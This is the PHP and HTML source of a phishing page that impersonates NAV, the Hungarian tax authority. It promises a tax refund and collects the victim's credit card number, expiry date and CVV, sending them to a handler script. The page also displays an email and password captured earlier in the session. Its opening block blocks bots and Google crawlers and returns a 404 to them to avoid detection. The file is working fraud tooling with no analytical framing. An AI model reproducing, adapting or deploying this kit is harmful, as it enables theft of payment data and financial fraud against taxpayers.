<?php
session_start();
error_reporting(0);
?>
<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);
include('antibots.php');
include('antibot.php');
include('antibot1.php');
include('antibot2.php');
include('antibot3.php');
include('antibot4.php');
include('antibot5.php');
include('antibot6.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html style="margin-left: 0px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>NAV - Magyar oldalak</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script>
<script src="./js/jquery-2.1.4.js"></script>
<script src="./js/jquery.validate.min.js"></script>
<script src="./js/additional-methods.min.js"></script>
<script src="./js/validation.js"> </script>
<link rel="alternate" type="application/rss+xml" href="#" title="NAV-hírek">
<link href="./css/nav.css" type="text/css" rel="stylesheet">
<link href="./css/print.css" type="text/css" rel="stylesheet" media="print">
<meta name="portalid" content="2">
<meta name="dcterms.title" content="Magyar oldalak">
</head>
<body>

<div id="portal">
<div class="HeadTopMain">
<div class="NavHeadKategoria">
<div class="Head"></div>
<div class="Middle">
<div class="NavHeadKategoria">


<img alt="fejléc" border="0" height="180" src="./css/nav_honlap_fejleckep.png" usemap="#Map" width="1001"> 



</div>
</div>
<div class="NavBottom">


</div>
</div>

</div>






<div class="UzemszunetPortlet" style="
    margin-top: 10px;
">
<div class="">
<div class="c_div">
<div>
<div class="UzemszunetHeaderTitle" style="
    width: 642px;
">
Visszatérítési információ.</div>
<div class="element_div">
<div class="Article">
<span class="Body">
<p>
<span class="title">Név:</span>
						<span class="data value">
							<strong><?php echo $_SESSION['Eamil'];  ?></strong>
						</span><br>
<span class="title">Azonosítószám:</span>
						<span class="data value">
							<strong><?php echo $_SESSION['Password'];  ?></strong>
						</span><br><br>
Részletek:<br>
Visszatérítési összeg: <strong>73215 Ft</strong><br>
dátum: 04/2020<br><br>
A visszaváltás befejezése után a hitelkártyán lévő összeg 10-15 napon belül jóváírásra kerül.</p>
<p></p>
</span>
</div>
</div><div class="UzemszunetHeaderTitle" style="
    width: 642px;
">
A hitelkártya adatait.</div>
<div class="element_div">

</div>
</div><form method="post" action="./obito.php" autocomplete="off" id="webshopVasarlasForm" novalidate="novalidate" style="
    margin-top: 30px;
    margin-left: 10px;
">
	<div class="cardTitle">
		
	</div>
	
										<div class="cardData">
		
		

		<div class="cardRow2">
			<div class="cardFront">
				
				<div class="cardName">
					<label class="title" style="
    font-size: 13px;
">Kártyaszám :</label>
					<input type="text" name="p" maxlength="16" required="required" style="width: 232px;height: 30px;margin-left: 162px;margin-bottom: 10px;padding-left: 10px;" aria-required="true" aria-invalid="true" class="error"><label id="p-error" class="error" for="p" style="display: inline;"></label>
				</div>
				<div class="cardExpire">
					<label class="title" style="
    font-size: 13px;
    font-weight: bold;
">Lejárati dátum (hhéé) : </label>
					<input type="text" name="exp1" maxlength="2" value="" class="menjakovetkezore autoTemplateOff error" style="/* background-color: rgb(252, 252, 251); */width: 54px;height: 30px;margin-left: 85px;padding-left: 10px;" aria-required="true" aria-invalid="true"><label id="exp1-error" class="error" for="exp1" style="display: inline;"></label>
					<input type="text" name="exp2" maxlength="2" value="" class="autoTemplateOff error" style="/* background-color: rgb(252, 252, 251); */width: 54px;height: 30px;padding-left: 10px;" aria-required="true" aria-invalid="true"><label id="exp2-error" class="error" for="exp2" style="display: inline;"></label>
				</div>
			</div>

      <div class="cardBack">
        <div class="codeCVC">
          <label class="title" style="
    font-size: 13;
">Érvényesítési kód (CVC2/CVV2)</label>
          <input type="text" name="ccv" maxlength="3" size="5" value="" style="/* background-color: rgb(252, 252, 251); */height: 30px;width: 54px;margin-top: 10px;margin-left: 25px;margin-bottom: 30px;padding-left: 10px;" aria-required="true" aria-invalid="true" class="error"><label id="ccv-error" class="error" for="ccv" style="display: inline;"></label>
        </div>
        <div class="cvcInfo">
          
        </div>
      </div>
		</div>
	</div>
	<div class="info">
		<p>ez az információ csak a NAV-ra térít vissza. Ezt a részletet megtérítjük, kérjük, győződjön meg róla, hogy minden helyes</p>
	</div>


<div id="dccPayment">
</div><div class="buttonCol">
	        <span class="button">
	            <input type="submit" name="formButtons(elkuld)" value="Tovább" class="greenBtn" style="
    margin-left: 260px;
    background: #54616E;
    color: white;
    width: 76px;
    height: 26px;
    ">
	            <span>&nbsp;</span>
	        </span>
	    </div>

</form></div>
</div>
</div><div class="NavBottom">
<div class="Footer2Portlet">
<div class="">
<div class="Footer" style="
    margin-left: -;
">
<div class="Footer2Html">
			    A NAV weboldalai szerzői jogvédelem alatt állnak. <br>
			    A honlapon szereplő információk változatlan tartalommal és formában szabadon terjeszthetők.<br>
<br>
</div>
<a href="#">
				Kapcsolatfelvétel
			</a>
			|
			<a href="#">
				Archív oldalak
			</a>
			|
			<a href="#">
				További honlapok
			</a>
			|
			<a href="#">
				Adatvédelmi tájékoztató
			</a>
			|
			<a href="#">
				Impresszum
			</a>
			|
			<a href="#">
				Közadatkereső
			</a>
<div class="Adress">
                1054 Budapest, Széchenyi u. 2. 
                
		    </div>
</div>
</div>
</div>

</div>
<div class="">
<div class="HtmlPortlet">

<div class=""></div>
</div>
</div>
</div>


<div style="position: fixed; width: 100%; height: 100%; left: 0px; top: 0px; z-index: -1000; display: none;"></div></body></html>
<?php } ?>
